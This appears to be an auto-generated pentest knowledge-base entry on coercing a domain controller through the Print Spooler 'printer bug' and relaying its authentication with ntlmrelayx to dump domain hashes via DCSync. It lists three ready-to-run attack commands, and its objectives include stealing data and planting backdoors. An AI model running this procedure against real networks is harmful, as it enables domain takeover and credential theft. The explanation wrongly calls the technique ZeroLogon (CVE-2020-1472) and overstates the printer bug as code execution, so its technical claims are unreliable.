---
id: eed4ed55-2db7-499b-b0b3-54016daaa41e
name: DC PrintSpooler Service Check and ntlmrelayx with printerbug.py
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:02.767338+00:00'
updated_at: '2023-04-10T20:36:02.498596+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Service Execution|T1035 - Service Execution]]'
tags:
- '[[Active Directory Attacks]]'
- '[[From CVE to SYSTEM shell on DC]]'
- '[[ZeroLogon]]'
commands:
- '[[Check if PrintSpooler service is running on DC]]'
- '[[Setup ntlmrelay]]'
- '[[Trigger printerbug]]'
---

# DC PrintSpooler Service Check and ntlmrelayx with printerbug.py

## Summary

DC PrintSpooler Service Check and ntlmrelayx with printerbug.py is a technique that leverages the ZeroLogon vulnerability (CVE-2020-1472) to escalate privileges in Active Directory environments. By exploiting a flaw in the Netlogon Remote Protocol (MS-NRPC), an attacker can impersonate any computer

## Description

# Description

DC PrintSpooler Service Check and ntlmrelayx with printerbug.py is a technique that leverages the ZeroLogon vulnerability (CVE-2020-1472) to escalate privileges in Active Directory environments. By exploiting a flaw in the Netlogon Remote Protocol (MS-NRPC), an attacker can impersonate any computer account in the domain and obtain domain admin privileges. This technique involves checking if the Print Spooler service is running on the Domain Controller, which is required for the attack to work. If it is, the attacker can use ntlmrelayx with printerbug.py to execute code on the DC and gain SYSTEM level access. This can be used to steal sensitive data, create new accounts, or install backdoors for future access.

 

## Requirements

1. Access to the target network

1. Credentials with local administrator privileges on a domain-joined machine

1. Python and impacket toolkit installed on the attacker machine

 

## Defense

1. Disable Netlogon Remote Protocol (MS-NRPC) on non-DC machines to prevent attackers from exploiting the ZeroLogon vulnerability

1. Enable LDAP signing and channel binding to protect against man-in-the-middle attacks

1. Monitor the Print Spooler service on Domain Controllers and disable it if not needed

 

## Objectives

1. Gain SYSTEM level access on the Domain Controller

1. Steal sensitive data

1. Create new accounts

1. Install backdoors for future access

 

# Instructions

1. In the first command, `rpcdump.py` is used to check if one DC is running the PrintSpooler service. The output is then filtered using `grep` to only show the relevant information. 

In the second command, `ntlmrelayx.py` is used to setup ntlmrelay with dcsync support on the specified DC. 

In the third command, `printerbug.py` is used to trigger the printerbug vulnerability on the target machine by passing in the necessary arguments.

 



**Code**: [[# Check if one DC is running the PrintSpooler serv]]



> The first command is used to check if the PrintSpooler service is running on a specific DC. This can be useful in identifying potential targets for the printerbug vulnerability. 

The second command is used to set up ntlmrelay with dcsync support on a specific DC. This can be used to obtain the password hashes of all domain users. 

The third command is used to trigger the printerbug vulnerability on the target machine. This vulnerability can allow an attacker to execute code with system privileges on the target machine.



**Command** ([[Check if PrintSpooler service is running on DC]]):

```bash
rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"
```





**Command** ([[Setup ntlmrelay]]):

```bash
ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
```





**Command** ([[Trigger printerbug]]):

```bash
python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Execution|TA0002 - Execution]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Service Execution|T1035 - Service Execution]]

## Commands Used

- [[Check if PrintSpooler service is running on DC]]
- [[Setup ntlmrelay]]
- [[Trigger printerbug]]

## Tags

- [[Active Directory Attacks]]
- [[From CVE to SYSTEM shell on DC]]
- [[ZeroLogon]]


